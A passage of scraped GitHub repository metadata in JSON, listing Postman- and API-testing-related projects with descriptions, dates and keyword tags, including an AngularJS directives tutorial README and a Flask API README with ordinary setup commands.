format","fork":false,"created_at":"2019-11-04T09:57:52Z","updated_at":"2019-11-28T03:26:53Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":21341419,"owner_login":"qdriven","owner_avatar_url":"https://avatars1.githubusercontent.com/u/21341419?v=4","pulled":1,"tags":["test"," postman","testing","form","format","convert","rent","converte","converter"]},{"id":40326550,"name":"Angular-Directive-Project","full_name":"sn0112358/Angular-Directive-Project","description":"Angular-Directive-Project Directives range from very basic to extremely complex. This project will build up to some somewhat difficult directives. Keep in mind that the format we're learning for directives is the same format used to build some extremely complex things in angular. Using directives often and well is one way to show you're a talented developer.  Starting Out  We've included only a few things for you to begin with. index.html, app.js, styles.css. At this point the best way to get more comfortable with angular is to initialize an app without relying heavily on boilerplate code (reusable code that starts out your projects for you).  You'll notice that in the index.html we've included the angular-route CDN. Yes, we'll be using angular's router here. Put an ng-view into your index.html.  In your app.js set up a config and set up our first route for when a user is at the '/home' url. If you're having trouble remembering how to set up the router go look at how you set up the router on the previous project. One way these projects will be beneficial to you is allowing you to look back at something *you** did and seeing how you got that something to work.* You may also want add an otherwise that defaults to /home. Create a controller and a template file for this route in your app folder. Don't forget to include the controller as a script in your index.html Check that everything is hooked up correctly. Try adding a div with some text in your home template just to make sure it's showing up. Once you've got that going you're ready to start on some directives. Now let's make our directive. We'll start with a simple one that we can use to display information passed to it.  Step 1. Start your directive  Woot. When you're initializing your directive just remember that it works very similarly to how you start up a controller or a service. It can also be very helpful to think of your directive as a route.  Create your directive. You'll use the directive method on your angular module. It takes two arguments, the name string and the callback function, which will return the object that represents your directive. When naming your directive give it a name with two words; dirDisplay would be nice, but anything works. Just remember it's best practice to give a directive a camel case name so that it's clear in your html what it is. Also we're going to need a template html for our directive. We could do it inline, but let's make another file instead. Just name it something that makes sense for the name of your directive and put it in the same directory as your directive file. For your template just make a  and inside a  tag that says User. Now in your home route html add in your directive. It will look like this if you named it dirDisplay:  Start up your app and go to the home route. Check and make sure you see User where your directive was placed. If you're not seeing it at this point it could mean a few things. Here's some more common issues. You didn't link your directive in your index as a script. Your name for your directive doesn't match the name in your html. Remember camel case becomes snake case so myDirective becomes . You're file path to your html template is wrong. You have to think of file paths in angular as relative to the index. Here's some code to see just for this part, and just for the directive's js file.  var app = angular.module('directivePractice'); app.directive('dirDisplay', function(){   return {     templateUrl: 'app/directives/dirDisplay.html'   }; }); What we're returning is the directive object. You won't see anymore code in this tutorial so it's important you get things working right and refer back to what you've already done to advance from now on.  Step 2. Advancing directives  Your directive should be loaded up now, but it's not really doing much. Let's make it better.  In your home controller. Make a variable on your $scope called user. Set it's value to {   name: \"Geoff McMammy\",   age: 43,   email: \"geofdude@gmail.com\" } Now inside your directive's html specifically inside the  tags display our new user's name. Then inside maybe some  tags display his email and age. This is going to work exactly the same as if it was just inside your home controller. Reload the page and make sure it works. This is still very cosmetic and really not all that useful. It needs functionality.  Add into your directive's object the link property. The link property's value is a function definition that takes (generally) three parameters. scope, element, and attributes. Unlike in other places with angular injection these parameter names don't carry meaning. The first parameter will always represent your $scope for that directive, the second will always be the element that wraps your whole directive, and the third will always be an object containing all the properties and values of the attributes on your directive in the dom. Try the following to get a feel for all three.  Add two attributes to your directive in your html. Like this -  Now in the link property you've added console.log the three parameters in the function. You'll see an object for scope that should look identical to the $scope of your html function. For element you'll see an object the represents the DOM wrapper for your directive. For attributes you'll see an object that will look like this:  {   test: \"myTest\",   myCheck: \"checkItOut\" } An important thing to notice is how it has again converted snake case to camel case for you. my-check became myCheck. Don't forget this. You'll run into this issue one day. It counts for both attributes and directive names.  To feel some of what the link function could do let's try this.  Add a ng-show to both the email and age wrappers. This should be familiar to you. Now inside your link function add a click event listener to your element property. It's going to look just like jQuery. element.on('click', function(){  }) Inside the click listener's callback add a toggle for the ng-show property you passed in. Along with a console.log to make sure things are connecting when you click. Try it out. Don't call for a mentor when it doesn't work. Let's talk about that first. You should see the console.log firing, but why isn't it toggling. This is going to be a common problem when working with the link function and event listeners. What we have here is an angular digest problem. The value is changing on the scope object, but the change isn't being reflected by our DOM. That's because angular isn't aware of the change yet. Anytime we cause an event to happen using something like jQuery or even angular's jQLite we need to let angular know that we've made a change.  Add this line of code in place of your console.log, scope.$apply(). Now try it out. It should be working now, so if you're still having issues it's time to debug. What we've done is forced angular to run it's digest cycle. This is where angular checks the scope object for changes and then applies those to the DOM. This is another good lesson to learn for later. You'll most likely hit this when making changes to your element using event listeners.  Step 3. Directive's re-usability.  Now our directive has some extremely basic functionality. One of a directive's greatest advantages though is its ability to be placed anywhere and still be functional. Let's say instead we had a list of users instead of just one.  Change the $scope property in your home controller to be users and give it this array as its value: [  {    name: \"Geoff McMammy\",    age: 43,    email: \"geofdude@gmail.com\",    city: \"Provo\"  },  {    name: \"Frederick Deeder\",    age: 26,    email: \"fredeed@gmail.com\",    city: \"Austin\"  },  {    name: \"Spencer Rentz\",    age: 35,    email: \"spencerrentz@gmail.com\",    city: \"Sacramento\"  },  {    name: \"Geddup Ngo\",    age: 43,    email: \"geddupngo@gmail.com\",    city: \"Orlando\"  },  {    name: \"Donst Opbie Leevin\",    age: 67,    email: \"gernee@gmail.com\",    city: \"Phoenix\"  } ] Now in your home HTML add a ng-repeat to the directive call. Tell it to repeat for each user in users. Reload your page. It's working! But why? How does each directive instance know what information to display?  In the link function console.log the scope parameter. Make sure it's outside of your click listener. You'll see five print outs in your console. Open up any one of them and look to the bottom. Open up the user property. It's exactly what we would want! But again why would that be the case? Don't get too caught up in this next bit if it's too hard to understand, but the ng-repeat is essentially making new tiny scope objects for each individual user in our users array. Now each of our directives is still getting a user property on the scope object just like the directive wanted in the beginning. Woot.  Step 4. Ramp it up with Isolate Scope.  Directives can do so much more. So let's make that happen. That means we should make.... a new directive!!! This directive's purpose will be to display a selected User and the weather in his/her/its location. Link it up just like the last one.  Create a js file for our directive and name it dirWeather. Make an html file named dirWeather.html. Link it up in your index.html and add the template to your new directive object. In your directive's template give it an  tag that says Weather just so we can know it's working. Above your ng-repeat on dirDisplay add your new dirWeather directive. If it's not working check the instructions above as to some common reasons why before asking a mentor for help. If you're seeing the Weather text on your page then we're ready to try out the dreaded Isolate Scope. The isolate scope object is one of the stranger API's in angular. I'm sorry but it is. Just refer to this for now.  scope: {  string: '@',  link: '=',  func: '&' } The properties on the scope object represent the attributes on the directive in the html. Our example scope object here would look something like this in the html.  The hard part here is the @, =, and &. They each have very important and distinct meanings.  @ says take in my attribute value as a string. = says take in my attribute value as a two-way bound variable from the parent scope. & says take in my attribute value as a reference to a function on the parent scope. It's also critical to point out that once you add a scope object you have no isolated your directive's scope. Meaning, aside from the values passed in through attributes, this directive has no connection to the $scope of its parent.  That being said let's isolate our directive's scope. :worried:  Add the scope property to your dirWeather. Give it the value of an object with a property of currentUser whose value is '='. Remember in your html this will look like current-user. This is the third time I've said so don't expect it again. This means that whatever comes into the currentUser attribute is going to be a value of the parent's scope object.  For now test this out by passing in users[0]. Find a way to show that users information inside your dirWeather's html. Remember inside your directive now the user is represented by currentUser. Step 5. &? &!?  The '=' value on your scope object has created a two-way binding between users[0] and currentUser. Now let's try out the '&'.  On your home controller add a function called getWeather. It takes one parameter called city. This function will make a call to a service so we'll need to create that. Make a weather service. Name it something cool and creative like weatherService. Inside the weather service make a function called getWeather that also takes one parameter, city. Make an $http get to this url - 'http://api.openweathermap.org/data/2.5/weather?q=' After the q= add on the city parameter. If you want you can test this out in postman. See what kind of data you get back. If it's the weather of that city then... you win! Use $q to return a promise that only resolves with the data you want. Temperature (preferably not in Kelvin) and the weather description. Use console.log on the data coming from the $http request to get to what you want. You'll need to add both on an object that you resolve your new promise with. On your home controller have it return the result of invoking the get getWeather function on the service. You should be returning a promise. Now in your home route's HTML pass in the getWeather function to the dirWeather directive through an attribute called weather-call. Add the attribute to your isolate scope object. That was a lot of linking, but let's walk through it. Your controller has a function linked to the service, which is in turn linked to your directive. So if you run the weatherCall function in your directive it will go through your controller to your service and then back.  Now things get a little bit tricky. Angular's way of passing along arguments through a directive to your controller are tricky, but once you understand how to do it, it's not hard. I'm going to give an example here of how it works.   Here's how it would look in your HTML. But where's the data supposed to be coming from? It seems that you'd rather be able to pass in data from your directive. Well you still can, you just have to essentially tell angular what do use as an argument to replace data when it calls that function in your controller. The actualy function call inside the directive will look like this.  $scope.passFunc({data: wantedData}) So what you'll do is pass in an object where the property name is what the argument is named in the HTML where you call the directive. That might sound confusing, but just look at the two code blocks above for a pattern. Note that pass-func becomes $scope.passFunc and data is being replaced with wantedData with the {data: wantedData} object. In our directive we want to replace city in the attribute call, for something else inside the directive. You'll follow the same pattern as above.  For now let's get things set up for that function call.  Add to the dirWeather directive object a property called controller. It's value will be a function. Yes, this is a controller specifically for your one directive. It works the same as any other controller, except you don't give it a name. It's $scope object will only be accessible within an instance of your directive. Don't forget to inject $scope in the function.  Inside your controller function run the weatherCall function with the city property from the currentUser on your $scope. Here's where you need to make sure you've passed in a city argument in the attribute function call, and then replace that with your currentUser's city using an object with a city property. The function call should return a promise, so call .then afterward and add the data onto your $scope to display both the weather and temperature of the currentUser's city. The properties can be named whatever makes sense to you.  You may also want to find a way to get rid of all the decimal places on your temperature. Now you should have everything hooked up so it shows Geoff's data and the weather data for Provo. But is that good enough?  Step 6. Ramping up our ramp up.  Now let's change this so it shows the weather data for whichever user we select. We're going to need to use '&' again.  Make a function on the home controller that takes in a parameter and sets a property on the $scope to be that parameter. Maybe you see where this is going.  We want to get this function into our dirDisplay controller. But in order to do that we need to isolate dirDisplay's scope. This also means we need to pass in each individual user through the scope object as well.  To make it easier on ourselves, let's pass the current user from our ng-repeat into our directive through a user attribute. This way we can leave our two-way bindings as they are. Also pass our new function that sets our current user from our home controller into our directive through a setUser attribute.  You'll need to add an argument in there again. Go with user. Your scope object in dirDisplay should have two properties. setUser with the value of '&' and user with the value of '='. As before we're going to need to do some tricky stuff to get our argument back to our controller.  Call the setUser function inside our click event listener and pass in an object the sets our user argument to be the user on our directive's scope object. If you've forgotten this part go back up and take a look at how you did it before or the example in this README.  Whatever user you click on now should show up in the dirWeather directive as the current user. But we're missing one thing, we want to be able to see the weather for that user too. We'll have to do one more thing that will seem a little bit tricky at first, but it's good to learn if you don't know it already since it's actually used quite frequently.  We need to step up a change listener on our currentUser in the dirWeather directive. We'll use angular's $watch functionality. $watch is a method on your $scope that will watch for changes in a variable you give it. It works in two ways.  $scope.$watch('property', function(value){  console.log(\"When $scope.property changes its new value is: \", value) }); And  $scope.$watch(function(){  return myVar }, function(value){  console.log(\"When myVar changes its new value is: \", value); }); Remove the immediate function call that we have in there now. Maybe just comment it out for now because we'll use it in a bit. Now call the $watch method on your scope and have it watch currentUser. Either way of using $watch is fine. Have its callback run the $scope.weatherCall function just like you had it before.  One thing to note is that $scope.$watch will always run once to begin with. Since that's what we want here it's great, but just be aware of that.  If you've reached this point congratulate yourself. You've messed with some serious stuff today, namely directives. There are still a lot of things about directives that we can't possibly cover in a single project. If you like what we've done so far then you're in a good place to keep going. A developer who understands directives well can build a really clean looking code base. Just look at your home.html. It could have just two lines in it. If you're feeling good move on now to Step 7.  Step 7. Finishing touches  Try to work out these problems on your own.  There should be a way to let the user know that the weather data is loading. Something that appears while our $http request is retrieving our data. The $http request shouldn't fire on both opening and closing a user's information. A color change for the currently active user would be nicer than showing that user's info inside the dirWeather modal. Or at least less redundant. Whatever else you want. We still haven't explored transclusion and ng-transclude so give that a try if you're feeling adventurous. Just know that it's a way for deciding where to put the HTML child elements of a directive. It's cool stuff that can involve some criss-crossing of scopes.","fork":false,"created_at":"2015-08-06T20:56:18Z","updated_at":"2019-03-11T21:13:13Z","stargazers_count":0,"watchers_count":0,"forks":14,"watchers":0,"score":1,"owner_id":13667207,"owner_login":"sn0112358","owner_avatar_url":"https://avatars3.githubusercontent.com/u/13667207?v=4","pulled":1,"tags":["test"," postman","create","data","request","form","file","script","service","call","http","user","develop","code","example","contain","format","convert","mail","line","help","route","build","function","load","calls","spec","list","star","read","import","users","learn","rent","more","plate","view","config","start","connect","email","very","functional","method","struct","info","developer","play","need","access","name","working","html","converte","learning","module","check","side","tutorial","infor","long","open","object","print","ever","information","template","case","result","control","esse","text","problem","practice","making","to do","place","between","link","under","right","specific","showing","along","variable","included","lines","getting","desc","within","folder","functionality","order","advance","parameter","following","controller","reference","those","done","ready","debug","needs","find","objects","repl","style","console","useful","note","angular","containing","current","should","single","location","easier","connection","sets","default","common","event","connecting","description","display","both","router","best","words","directory","usable","projects","things","another","complex","added","being","third","select","fire","wrapper","doing","correct","path","cause","while","media","going","keep","replace","stuff","home","boiler","expect","issue","still","having","instead","boilerplate","three","definition","currently","adding","better","helpful","talk","little","match","lesson","ember","makes","instruction","previous","city","named","general","instance","familiar","important","become","forge","explore","mean","inside","properties","onto","passing","listen","weather","something","names","reusable","inject","array","least","shows","comfortable","tiny","always","clean","cool","five","namely","invoking","initial","returning","actually","wrappers","wraps","talent","whole","element","directives","elements","essential","sense","arent","much","every","wanted"]},{"id":211287084,"name":"go-test","full_name":"spider1998/go-test","description":"Interface testing tool for pure go language development (similar to postman)","fork":false,"created_at":"2019-09-27T09:44:00Z","updated_at":"2019-10-31T07:05:18Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":42063601,"owner_login":"spider1998","owner_avatar_url":"https://avatars1.githubusercontent.com/u/42063601?v=4","pulled":1,"tags":["test"," postman","testing","tool","develop","development","face","lang","language","pure"]},{"id":80915161,"name":"PocketHTTP","full_name":"zqzten/PocketHTTP","description":"A lightweight iOS app to let you test your HTTP APIs easily on the go.","fork":false,"created_at":"2017-02-04T11:31:08Z","updated_at":"2017-05-18T13:04:18Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":22231232,"owner_login":"zqzten","owner_avatar_url":"https://avatars3.githubusercontent.com/u/22231232?v=4","pulled":1,"tags":["test","light","easily","lightweight"]},{"id":186892992,"name":"Backend-","full_name":"sangwan-ankit/Backend-","description":"Here we are going to learn how to create API in simplest way and test that API using Postman.","fork":false,"created_at":"2019-05-15T19:49:07Z","updated_at":"2019-05-15T19:49:10Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":50514865,"owner_login":"sangwan-ankit","owner_avatar_url":"https://avatars3.githubusercontent.com/u/50514865?v=4","pulled":1,"tags":["test","create","learn","going","simples","simplest"]},{"id":223029917,"name":"GithubActions.NewmanTestsDockerCompose","full_name":"domingoladron/GithubActions.NewmanTestsDockerCompose","description":"Using Bitbucket Pipelines' Docker-in-Docker support, you can run your Postman tests against a Docker Compose API","fork":false,"created_at":"2019-11-20T21:21:51Z","updated_at":"2019-11-22T04:19:32Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":28288031,"owner_login":"domingoladron","owner_avatar_url":"https://avatars0.githubusercontent.com/u/28288031?v=4","pulled":1,"tags":["test","tests","tests ","line","support","lines","bucket"]},{"id":175605566,"name":"curlToJavaCode","full_name":"shanpali/curlToJavaCode","description":"This util will help create executable testng test from a postman collection","fork":false,"created_at":"2019-03-14T11:07:36Z","updated_at":"2019-03-14T11:21:07Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":15906237,"owner_login":"shanpali","owner_avatar_url":"https://avatars3.githubusercontent.com/u/15906237?v=4","pulled":1,"tags":["test"," postman","collect","collection","create","postman collection","help","util","executable","testng"]},{"id":240797594,"name":"trainer-springboot2-java-11","full_name":"daniloazevedosanti/trainer-springboot2-java-11","description":"Sistema Restful Java 11 - Spring Boot - (Web Api) - Para testes use o postman","fork":false,"created_at":"2020-02-15T22:36:46Z","updated_at":"2020-03-01T00:21:35Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":45345110,"owner_login":"daniloazevedosanti","owner_avatar_url":"https://avatars3.githubusercontent.com/u/45345110?v=4","pulled":1,"tags":["test"," postman","testes"]},{"id":166264152,"name":"java-spring-mvc-demo-books","full_name":"andynhn/java-spring-mvc-demo-books","description":"Add update and delete methods and test the endpoints with Postman","fork":false,"created_at":"2019-01-17T17:06:18Z","updated_at":"2019-01-17T18:42:42Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":43735217,"owner_login":"andynhn","owner_avatar_url":"https://avatars2.githubusercontent.com/u/43735217?v=4","pulled":1,"tags":["test","endpoint","points","endpoints","update","delete","method","methods"]},{"id":222973850,"name":"APIRest-SpringBoot","full_name":"Bruno-Sesso/APIRest-SpringBoot","description":"Como construir e testar uma API em Java utilizando o Postman","fork":false,"created_at":"2019-11-20T15:54:25Z","updated_at":"2019-11-22T17:48:31Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":21224648,"owner_login":"Bruno-Sesso","owner_avatar_url":"https://avatars3.githubusercontent.com/u/21224648?v=4","pulled":1,"tags":["test","util","star","utilizando","construir"]},{"id":197391693,"name":"gerenciador-viagens","full_name":"olvfg/gerenciador-viagens","description":"https://medium.com/assertqualityassurance/como-construir-e-testar-uma-api-em-java-utilizando-o-postman-baae69d8b8aa","fork":false,"created_at":"2019-07-17T13:07:46Z","updated_at":"2019-07-17T13:10:54Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":39816180,"owner_login":"olvfg","owner_avatar_url":"https://avatars0.githubusercontent.com/u/39816180?v=4","pulled":1,"tags":["test","http","https","util","star","java","utilizando","assert","quality","como","construir","assurance"]},{"id":73948533,"name":"javascript-at","full_name":"theuggla/javascript-at","description":"ranging from small programs to full applications testing out javascript concepts, both as standalone applications, servers and client applications","fork":false,"created_at":"2016-11-16T18:24:52Z","updated_at":"2018-12-12T14:01:57Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":20565872,"owner_login":"theuggla","owner_avatar_url":"https://avatars2.githubusercontent.com/u/20565872?v=4","pulled":1,"tags":["test","testing","application","script","server","client","full","java","program","small","applications","concept","javascript","both","servers","concepts","standalone","ranging"]},{"id":226859706,"name":"TesterQA-PROEM","full_name":"rominamc/TesterQA-PROEM","description":"Testing manual:documentación. Metodologias agiles.Kanban.Scrum.Ambientes de testing QC/QA. Software para testing de automatización:Registro de bugs:Redmine,Jira.Regresión: Selenium web driver.Katalon recorder.Testing unitario (java):JUnit.Webservice:Postman","fork":false,"created_at":"2019-12-09T11:53:47Z","updated_at":"2019-12-18T16:47:25Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":14793590,"owner_login":"rominamc","owner_avatar_url":"https://avatars3.githubusercontent.com/u/14793590?v=4","pulled":1,"tags":["test","testing","service","document","auto","automat","java","unit","drive","todo","order","mine","river","manua","agile"]},{"id":151757025,"name":"ESB-Training","full_name":"vgane/ESB-Training","description":"Using Mulesoft AnyPointStudio to implement various integration patterns. Uses Java, MySQL DB, MUNIT testing, Postman, SOAP API, Restful API, SOAP UI, maven, AWS SNS, CRM(Salesforce), batchjobs, cronjobs, error_handling","fork":false,"created_at":"2018-10-05T17:40:38Z","updated_at":"2019-11-04T19:55:26Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":30202836,"owner_login":"vgane","owner_avatar_url":"https://avatars1.githubusercontent.com/u/30202836?v=4","pulled":1,"tags":["test","testing","implement","integration","various","handling","maven","error","batch"]},{"id":142798122,"name":"Multithread-Web-Server","full_name":"xzhang007/Multithread-Web-Server","description":"Developed a web server in Java capable of handling HTTP requests and parsing those requests, and sending out various HTTP responses. • Handles basic user authentication and CGI which could execute concurrently using multithreading and synchronized method. And it could send binary files like images over network. • Using GitHub repository to control versions and Postman to test as well as factory design pattern.","fork":false,"created_at":"2018-07-29T21:54:31Z","updated_at":"2018-11-07T23:21:53Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":16105149,"owner_login":"xzhang007","owner_avatar_url":"https://avatars1.githubusercontent.com/u/16105149?v=4","pulled":1,"tags":["test","repo","request","file","repos","repository","server","requests","user","sign","auth","files","send","read","authentication","response","rent","version","image","method","control","design","various","images","responses","sync","handling","sending","those","actor","current","network","execute","currently","reading","versions","parsing","capable"]},{"id":46812176,"name":"MessengerApp","full_name":"karthikeyaJ/MessengerApp","description":"Developed RESTful APIs with JAX-RS. Built a sample Social Media API (JAVA EE) Developed a sample REStful web service, designed the API’s, implemented using Jersey and deployed using Tom cat Server. Made use of Postman Client to build, test and document the API.","fork":false,"created_at":"2015-11-24T18:59:55Z","updated_at":"2015-11-24T19:04:46Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":9103489,"owner_login":"karthikeyaJ","owner_avatar_url":"https://avatars0.githubusercontent.com/u/9103489?v=4","pulled":1,"tags":["test","service","document","implement","sign","build","sample","design","deployed","implemented","designed"]},{"id":175287714,"name":"book-store-tutorial-flask","full_name":"kootoomo/book-store-tutorial-flask","description":"Flask Tutorial at ubuntu (\"book store\" tested in Postman, No front-end stuff - templates, etc.)","fork":false,"created_at":"2019-03-12T20:01:53Z","updated_at":"2019-03-26T20:54:12Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":36704577,"owner_login":"kootoomo","owner_avatar_url":"https://avatars3.githubusercontent.com/u/36704577?v=4","pulled":1,"tags":["test","tested","front","plate","store","book","template","templates","stuff","ubuntu","\"book"]},{"id":179940753,"name":"Skills","full_name":"pavelsaman/Skills","description":"A simple flask website for tracking skills. Written in Python, flask. Tests in pytest, Postman (and newman) and Robot framework. ","fork":false,"created_at":"2019-04-07T09:00:44Z","updated_at":"2019-09-15T09:51:01Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":24702416,"owner_login":"pavelsaman","owner_avatar_url":"https://avatars3.githubusercontent.com/u/24702416?v=4","pulled":1,"tags":["test","newman","framework","site","website","flask","track","pytest","skills","tracking"]},{"id":170832484,"name":"Blockchain","full_name":"mdsalik7/Blockchain","description":"Building a Blockchain on Python using Web Application Framework Flask and testing it on Postman","fork":false,"created_at":"2019-02-15T08:51:47Z","updated_at":"2019-02-24T20:25:43Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":42892152,"owner_login":"mdsalik7","owner_avatar_url":"https://avatars3.githubusercontent.com/u/42892152?v=4","pulled":1,"tags":["test","testing","chai"]},{"id":249239589,"name":"studentbook","full_name":"daenco/studentbook","description":"Building a RESTful API using Flask, PostgreSQL, JWT, Postman, pytest, uWSGI, NGINX & Docker","fork":false,"created_at":"2020-03-22T17:48:20Z","updated_at":"2020-03-22T21:50:02Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":57138377,"owner_login":"daenco","owner_avatar_url":"https://avatars0.githubusercontent.com/u/57138377?v=4","pulled":1,"tags":["test","pytest"]},{"id":131698530,"name":"cryptocurrency","full_name":"sumeetrohra/cryptocurrency","description":"This is a basic cryptocurrency  made using python Flask and tested in postman","fork":false,"created_at":"2018-05-01T09:57:38Z","updated_at":"2018-05-01T09:57:45Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":14572393,"owner_login":"sumeetrohra","owner_avatar_url":"https://avatars0.githubusercontent.com/u/14572393?v=4","pulled":1,"tags":["test"," postman","tested","python","currency","crypto","cryptocurrency"]},{"id":188559312,"name":"IreporterReactJs","full_name":"LarryKarani/IreporterReactJs","description":"# iReporterApi iReporter is an application whose aim is to reduce corruption in Africa and foster economic development. It allows users to create red flags and interventions. It implents the following list of APIs.  ### Framework used The application is built using python: flask framework. >[Flask](http://flask.pocoo.org/) is a microframework for the Python programming language.   ### End points Method | Endpoint | Usage | | ---- | ---- | --------------- | |POST| `/api/v2/auth/signup` |  Register a user. | |POST| `api/v2/auth/login` | Login user.| |POST| `api/v2/auth/logout` | Logs out a user.| |POST| `api/v2/interventions` | Create a new incident. | |GET| `api/v2/interventions` | Get all the created incidents. | |GET| `api/v2/interventions/user` | Get all incident of the logged in user. | |GET| `api/v2/interventions/` | Get a single incident. | |PATCH| `api/v2/interventions//location` | Update a single incident location. | |PATCH| `api/v2/interventions//comment` | Update a single incident comment. | |PATCH| `api/v2/interventions//status` | Update a single incident status. | |DELETE| `api/v2/interventions/` | Delete a single incident. |  ## Installation 🕵 - To run on local machine git clone this project : ``` $ git clone https://github.com/larryTheGeek/iReporterApi.git ``` Copy and paste the above command in your terminal, the project will be downloaded to your local machine.  To Install python checkout: ``` https://www.python.org/ ```  - create a virtualenv and make it use python 3 using the following command. ``` $ virtualenv -p python3 env ``` - activate the virtual environment ```  $ source env/bin/activate ``` - Install Requirements ``` $ pip install -r requirements.txt ``` ### Testing - Run Test using pytest with the following command ``` $ py.test --cov=app test`  ``` you will get the test coverage report on your terminal   The app can also be tested via Postman - Run App  ``` $ python run.py ``` The app should be accessiable via : http://127.0.0.1:5000/  open postman and navigate to the API endpoints described above  ### HEROKU URL  https://ireporter-version2.herokuapp.com/api/v2/   ### Owner - Larry Karani  ### Motivation https://www.youtube.com/watch?v=wHRUDL7GKmI","fork":false,"created_at":"2019-05-25T11:43:18Z","updated_at":"2019-05-28T07:00:53Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":22986772,"owner_login":"LarryKarani","owner_avatar_url":"https://avatars1.githubusercontent.com/u/22986772?v=4","pulled":1,"tags":["test"," postman","create","repo","application","http","user","develop","sign","environment","auth","endpoint","points","tested","framework","https","endpoints","load","local","list","source","built","users","stat","version","python","development","command","access","check","program","report","github","allows","open","lang","micro","install","flask","login","clone","desc","download","status","require","following","machine","reporter","should","single","location","terminal","heroku","language","coverage","signup","programming","pytest","foster","youtube","ireporter"]},{"id":98640565,"name":"API-Testing-Framework","full_name":"Akanksha461/API-Testing-Framework","description":"Api testing framework using postman BDD and integrated with Jenkins for CI(continuous integration)","fork":false,"created_at":"2017-07-28T10:50:34Z","updated_at":"2018-01-25T16:31:02Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":27349720,"owner_login":"Akanksha461","owner_avatar_url":"https://avatars1.githubusercontent.com/u/27349720?v=4","pulled":1,"tags":["test"," postman","testing","framework","integration","integrate","integrated","continuous"]},{"id":210782397,"name":"Backend-Server_typescript","full_name":"martinc278/Backend-Server_typescript","description":"Created and deployed a backend server using typescript, used Framework Nest and tested with postman","fork":false,"created_at":"2019-09-25T07:27:30Z","updated_at":"2019-11-13T08:51:36Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":33938608,"owner_login":"martinc278","owner_avatar_url":"https://avatars0.githubusercontent.com/u/33938608?v=4","pulled":1,"tags":["test"," postman","script","server","tested","backend","type","deployed","types","typescript"]},{"id":65542288,"name":"Entity-Framework-Core-Relationship-Web-API","full_name":"ranovladimir/Entity-Framework-Core-Relationship-Web-API","description":"Here is a sample project running on ASP .NET CORE using : - Entity Framework Core in command line (dotnet ef) - Relationships with Data annotation and Fluent API - WEB API (CRUD) => I using PostMan for test. To Getting started, please read the readme.txt file into the project.","fork":false,"created_at":"2016-08-12T09:42:35Z","updated_at":"2016-10-05T03:26:04Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":17979737,"owner_login":"ranovladimir","owner_avatar_url":"https://avatars0.githubusercontent.com/u/17979737?v=4","pulled":1,"tags":["test","file","line","sample","star","read","running","start","command","command line","started","please","notation","readme","dotnet"]},{"id":201517749,"name":"note-app","full_name":"luxie11/note-app","description":"An API created for saving user tasks. For API testing used Postman. This API can be user for WEB application creation with React, Vue or any front-end framework. ","fork":false,"created_at":"2019-08-09T18:03:55Z","updated_at":"2019-08-09T19:53:51Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":29857050,"owner_login":"luxie11","owner_avatar_url":"https://avatars3.githubusercontent.com/u/29857050?v=4","pulled":1,"tags":["test","create","testing","application","user","framework","front","task","creation","tasks","saving"]},{"id":159670446,"name":"QA-automation-programmer","full_name":"TVoroshilova/QA-automation-programmer","description":"At least 2 years experience in Testing Automation Development using known software testing tools and frameworks as Selenium, Appium, Postman, etc. ∙ Experience with Web, DB (SQL/NoSQL) and API testing – Must. ∙ Experience with working over Linux OS and public cloud environments – Must. ∙ Experience with defect tracking system (as GIT, Jira or VSTS/Azure Dev Ops) – Must. ∙ Experience in working with Docker – Advantage.We are seeking an experienced QA automation programmer that will be leading the testing automation activities for our SaaS product. ∙ The QA automation programmer will be part of an innovative team developing a challenging, cutting edge technology Web application for the e-Commerce world. ∙ Main responsibilities: Develop test plans including functional testing, end user testing, stress, performance, reliability and usability testing. o Evaluate product code according to specifications, report and track bugs and fixes. o Execute automatic tests on the product during development and pre-release stages. o Work closely with R&D and product teams on new features, system integration and performance testing as a part of a startup company stationed in Israel. o Participate in the complete development process using the agile methodology. ∙ Academic degree from a known institution.High level English – very good writing skills, fluent speech.The candidate agrees to work from Trust’s offices and not remotely from home.Salary expectations: Up to 2000 USD (Gross salary)","fork":false,"created_at":"2018-11-29T13:27:02Z","updated_at":"2018-11-29T13:27:02Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":45455770,"owner_login":"TVoroshilova","owner_avatar_url":"https://avatars2.githubusercontent.com/u/45455770?v=4","pulled":1,"tags":["test","repo","testing","form","tests","application","tool","tests 